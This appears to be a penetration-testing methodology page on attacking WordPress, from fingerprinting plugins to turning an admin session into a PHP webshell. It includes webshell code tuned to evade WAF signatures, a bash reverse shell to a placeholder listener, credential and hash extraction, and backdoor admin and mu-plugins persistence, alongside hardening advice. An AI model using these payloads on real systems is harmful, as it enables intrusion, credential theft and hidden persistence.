---
title: WordPress
layout: post
date: 2026-08-08
description: "Attacking WordPress: fingerprinting the install, turning a plugin CVE into a session, and why an administrator account is already remote code execution."
permalink: /theory/misc/wordpress
---

## Overview

WordPress powers a large share of the public web, and the pattern of how it falls over is remarkably consistent. Core itself is a hard target: it is audited, it patches quickly, and unauthenticated core RCE is rare enough to be news. Almost everything else about a WordPress install is soft.

The attack surface splits into five parts, and it is worth naming them because they fail in different ways:

| Surface | Who maintains it | Typical failure |
|---|---|---|
| Core | WordPress team | Rare, usually role-gated |
| Themes | Third party | File editors, unauth options |
| Plugins | Third party, ~60k of them | The overwhelming majority of CVEs |
| Users and roles | The site owner | Weak passwords, over-privileged accounts |
| Content and uploads | Everyone | `wp-content` is executable document root |

Two structural facts drive most WordPress engagements:

1. **Plugins are the answer roughly nine times out of ten.** They run with full WordPress privileges, they are written by anyone, and a site typically has ten to thirty of them.
2. **Administrator is not a step below code execution, it is the same step.** WordPress ships a PHP file editor in the admin panel. Any path that produces an admin session has produced RCE, and no further vulnerability is required.

> When scoping a WordPress target, the question is never "is WordPress vulnerable". It is "which plugin is old, and does its advisory say `Unauthenticated` or `Subscriber+`". Everything else is enumeration in service of that question.
{: .prompt-tip }

## Fingerprinting

### Version

The core version leaks from several places, most of them on by default:

```bash
# generator meta tag on any page
curl -s http://$IP/ | grep -i 'name="generator"'

# RSS feeds carry it too, and are rarely stripped
curl -s http://$IP/feed/ | grep -i '<generator>'

# the readme ships with the release and is world-readable
curl -s http://$IP/readme.html | grep -i 'version'
```

Themes and plugins are versioned independently of core, and their versions are what actually matter.

### Users

WordPress leaks usernames by design in three places:

```bash
# REST API: every user who has authored a published post
curl -s http://$IP/wp-json/wp/v2/users | jq -r '.[] | "\(.id)  \(.slug)  \(.name)"'

# author archive redirect: /?author=1 redirects to /author/<login>/
curl -s -I "http://$IP/?author=1" | grep -i location

# XML-RPC, if enabled
curl -s -d '<methodCall><methodName>system.listMethods</methodName></methodCall>' \
  http://$IP/xmlrpc.php
```

The login form is also an oracle in the default configuration: a wrong username and a wrong password produce different error strings. That behaviour is worth confirming rather than assuming, because several security plugins normalise it.

### Plugins and themes

This is where scans most often go wrong, so it is worth understanding what the tooling is doing.

[WPScan](https://github.com/wpscanteam/wpscan) has three plugin-detection modes, and **the default is the weakest one**:

| Mode | Method | Blind spot |
|---|---|---|
| `passive` (default) | Parses page HTML for enqueued plugin assets | Anything with no front-end output |
| `aggressive` | Requests ~1500 known plugin directory paths | Plugins outside its list |
| `mixed` | Both | |

Passive detection can only see a plugin that enqueues a CSS or JS file on the page being parsed. Backend-only plugins, remote-management agents, backup tools, SEO panels and integration connectors render nothing on the public site and are therefore **invisible** to a default scan. A target that looks clean under `wpscan --url` alone has not been enumerated.

```bash
# -e p enumerates plugins; mixed forces the aggressive path probes as well
wpscan --api-token $WPSCAN_API_TOKEN -e p --plugins-detection mixed --url http://$IP

# vp = vulnerable plugins only, vt = vulnerable themes, u = users
wpscan --api-token $WPSCAN_API_TOKEN -e vp,vt,u --plugins-detection mixed --url http://$IP
```

The API token only affects the *vulnerability* lookup. Without it WPScan still enumerates versions, it simply will not map them to CVEs.

Two response codes to read correctly when probing plugin paths:

- **404** means the plugin is not installed.
- **403** means the directory exists and indexing is off. That is a positive hit, not protection. It is also a common false-positive source on hosts that blanket-403 everything under `wp-content`.

Version numbers usually come from `readme.txt` rather than from PHP, because every plugin in the official repository ships one and it stays world-readable even when directory listing is forbidden:

```bash
curl -s http://$IP/wp-content/plugins/<slug>/readme.txt | head -5
```

The `Stable tag:` field describes the version the author *published*, which is not guaranteed to match the code on disk. Scanners report this as reduced confidence for exactly that reason, and it rarely matters in practice: what you need is usually "is it below the fixed version", not the exact patch level.

> Blocking directory listing hides nothing useful. It leaves `readme.txt`, the plugin's own HTTP routes, and its PHP entry points fully reachable, all of which are required for the plugin to work at all. Plugin enumeration is not meaningfully preventable, which is an argument for patching rather than for hiding.
{: .prompt-warning }

## Reading a WordPress advisory

Plugin advisories carry a role prefix that decides whether the finding is usable, and it is the first thing to check:

| Prefix | Means | Usable from zero? |
|---|---|---|
| `Unauthenticated` | No account needed | Yes |
| `Subscriber+` | Any registered account | Only if registration is open |
| `Contributor+` / `Author+` | Content-creating account | Rarely |
| `Admin+` | Administrator already required | No, and see below |

`Admin+` findings are worth understanding rather than dismissing. Since an administrator can already execute PHP through the file editor, an `Admin+` file-upload or code-execution advisory is not an escalation at all. Those CVEs exist to describe the *hardened* configuration, where `DISALLOW_FILE_EDIT` is set, and in that context they matter a great deal.

The same reasoning applies to core. A version four years out of date can carry dozens of listed vulnerabilities and still be unexploitable from an unauthenticated position, because nearly all of them are role-gated. Count the `Unauthenticated` entries, not the total.

## Sessions and cookies

Once something hands you a session, knowing the cookie format tells you what you are holding.

WordPress suffixes its cookie names with `COOKIEHASH`, the MD5 of the site URL:

```bash
echo -n 'http://10.0.23.197' | md5sum
```

```
31e7501ce5f4e30fb4bb879c5737549a  -
```

The main session cookie is therefore `wordpress_logged_in_<COOKIEHASH>`, and its value is four pipe-separated fields (URL-encoded, so `%7C` is `|`):

```
<user_login>|<expiration>|<session_token>|<hmac>
```

| Field | Meaning |
|---|---|
| `user_login` | The account name, in plaintext |
| `expiration` | Unix timestamp, 2 days normally or 14 with "remember me" |
| `session_token` | One per active session, stored in `wp_usermeta` |
| `hmac` | HMAC-SHA256 over the first three fields |

The HMAC is keyed on the site's `LOGGED_IN_KEY` and `LOGGED_IN_SALT` from `wp-config.php`, combined with a fragment of the user's password hash. Three consequences follow:

- The cookie **cannot be forged** without reading `wp-config.php` and the user's hash, which means having code execution already.
- The first field gives you the administrator's username for free, before loading a single admin page.
- Changing a user's password invalidates their cookies, because the hash fragment feeds the key.

An authentication-bypass CVE that returns a working cookie has therefore not broken WordPress's session cryptography. It has convinced WordPress to perform the signing on the attacker's behalf, usually by reaching `wp_set_auth_cookie()` on a code path that should have been unreachable.

Nonces are a separate mechanism and a common source of confusion: WordPress nonces are CSRF tokens, not authentication. A valid nonce with no session proves nothing, and a valid session with no nonce is usually only a `wp_verify_nonce()` call away from working.

## Administrator to code execution

This is the step that surprises people new to WordPress, so it is worth stating flatly: **there is no privilege boundary between "administrator" and "arbitrary PHP" in a default install.** The admin panel contains a PHP editor. Reaching admin is the end of the exploitation phase, not the middle of it.

There are four routes, in rough order of preference.

### 1. Theme File Editor

The built-in editor requires the `edit_themes` capability, which administrators hold by default.

**Where it lives depends on the active theme.** With a classic theme it is at *Appearance > Theme File Editor*. With a **block theme** active (Twenty Twenty-Two and later, and any FSE theme), WordPress replaces the Appearance submenu with the Site Editor and moves the file editor to **Tools > Theme File Editor**. Older tutorials all point at Appearance, and looking there on a modern install finds nothing.

The editor's theme selector lists every **installed** theme, not only the active one. Prefer editing an inactive theme:

- A PHP syntax error in the *active* theme white-screens the site and can cost the access you just gained.
- The change is invisible to anyone browsing the site.
- It works exactly as well, for the reason in the next section.

`404.php` is a good target file in any stock theme: it is short, it is rarely read, and it is not loaded on the homepage. The payload goes at the very top, before any WordPress function call:

```php
if( isset($_GET[0])){
    system($_GET[0]);
}
```

`$_GET[0]` is worth a note. PHP accepts numeric keys from a query string, so `?0=id` populates `$_GET[0]`, and a bare digit sidesteps the obvious `cmd=`, `c=` and `e=` signatures that generic WAF rules and log-review greps key on. The general webshell forms are in the [PHP notes](/theory/misc/php).

### 2. Plugin File Editor

*Plugins > Plugin File Editor*, gated on `edit_plugins`. Identical in effect. Slightly riskier, since a fatal error in an active plugin can take the admin panel down with the site.

### 3. Upload a plugin

*Plugins > Add New > Upload Plugin* accepts a zip. A two-file archive with a plugin header comment and a webshell is enough, and unlike the file editor this route survives `DISALLOW_FILE_EDIT` (it needs `DISALLOW_FILE_MODS` to be blocked):

```php
<?php
/*
Plugin Name: Diagnostics
*/
system($_GET[0]);
```

### 4. Media library

Normally a dead end. `wp_check_filetype_and_ext()` rejects `.php` and the `upload_mimes` allow-list does not include it. It becomes viable when a plugin adds its own upload handler that skips those checks, which is a whole CVE class of its own, or when it is chained with a local file inclusion that will execute an uploaded image.

### Why the planted file executes

Themes and plugins live under `wp-content/`, which is ordinary document root content as far as the web server is concerned. Requesting the file directly does **not** route through WordPress:

- `index.php` never runs, so the rewrite rules never apply.
- `wp-load.php` never runs, so no plugin, hook or theme is initialised.
- Nothing ever asks whether the theme is active.

The server simply hands the file to the PHP interpreter. That explains two behaviours:

**An inactive theme is exactly as executable as the active one.** "Active" is a WordPress concept, and WordPress is not in the request path.

**Everything after the payload fails, which is a feature.** `get_header()`, `esc_html_e()` and every other template function is undefined without the bootstrap, so PHP fatals immediately after `system()` returns. With `display_errors` off, the response body contains the command output and nothing else, giving a cleaner shell than a full template render would:

```bash
curl "http://$IP/wp-content/themes/twentytwentyone/404.php?0=id"
```

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Upgrading to an interactive shell is a matter of encoding the payload properly. `curl -G --data-urlencode` handles the spaces, quotes, `>` and `&` that a reverse shell one-liner is full of:

```bash
curl "http://$IP/wp-content/themes/twentytwentyone/404.php" \
  -G --data-urlencode '0=bash -c "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"'
```

> **The webshell needs no authentication.** The admin session was required to *plant* the file; it is not required to *use* it. Anything written under `wp-content/` is world-reachable over HTTP. This is why incident response on a compromised WordPress site has to diff the theme and plugin directories against a known-good copy. Auditing user accounts, resetting passwords and revoking sessions removes the attacker's route in and leaves the shell untouched.
{: .prompt-danger }

## Post-exploitation on the host

Once you have execution as the web user, `wp-config.php` at the web root is the first read:

```bash
grep -E "DB_|_KEY|_SALT|table_prefix" /var/www/html/wp-config.php
```

It yields the database credentials, the eight authentication keys and salts, and the table prefix. The salts matter because they are what makes cookie forging possible after the fact, and the DB credentials are frequently reused for a system account.

User hashes live in `wp_users.user_pass`:

```bash
mysql -u <DB_USER> -p'<DB_PASSWORD>' <DB_NAME> -e \
  "SELECT ID,user_login,user_pass FROM wp_users;"
```

Two hash formats occur, and they crack very differently:

| Prefix | Format | Hashcat mode |
|---|---|---|
| `$P$` | phpass portable MD5, 8192 iterations | `400` |
| `$wp$2y$` | bcrypt, default since WordPress 6.8 | `28400` |

If `wp-cli` is present, adding an administrator is one command, though it is noisy and shows up in the user list:

```bash
wp user create backup backup@localhost --role=administrator --user_pass='<pass>' --allow-root
```

Quieter persistence lives in `wp-content/mu-plugins/`. Must-use plugins load automatically on every request, cannot be deactivated from the admin panel, and do not appear in the normal plugin list. Creating that directory when it does not already exist is itself a strong indicator, which cuts both ways.

## Hardening notes

- `define('DISALLOW_FILE_EDIT', true);` removes both file editors. `define('DISALLOW_FILE_MODS', true);` additionally blocks plugin and theme installs and updates. Neither is a security boundary against a determined attacker with admin, but both raise the cost from "one click" to "needs another bug", which is exactly why `Admin+` advisories exist.
- Deny PHP execution inside `wp-content/uploads/` at the web server level. It costs nothing and removes an entire chain.
- The web server user should not own the WordPress files it serves, and should not be in groups that grant more than file access. A `www-data` account that is also in `docker`, `lxd`, `disk` or `sudo` turns every plugin RCE into full host compromise.
- Patch plugins on a schedule, and uninstall rather than deactivate the ones nobody uses. A deactivated plugin's files are still on disk and still reachable by URL.

## Examples on this site

Boxes on this site whose path goes through WordPress, listed automatically from their tags:

{% assign wp_tags = "wordpress" | split: "," -%}
{% for post in site.posts -%}
{%- assign match = false -%}
{%- for t in post.tags -%}
{%- if wp_tags contains t -%}{%- assign match = true -%}{%- endif -%}
{%- endfor -%}
{%- if match %}
- [{{ post.title }}]({{ post.url }}){% endif -%}
{%- endfor %}

## References

- [WordPress - Hardening WordPress](https://developer.wordpress.org/advanced-administration/security/hardening/)
- [WordPress - Editing wp-config.php](https://developer.wordpress.org/advanced-administration/wordpress/wp-config/)
- [WordPress - Roles and Capabilities](https://wordpress.org/documentation/article/roles-and-capabilities/)
- [WPScan Vulnerability Database](https://wpscan.com/wordpresses/)
- [Patchstack Vulnerability Database](https://patchstack.com/database/)
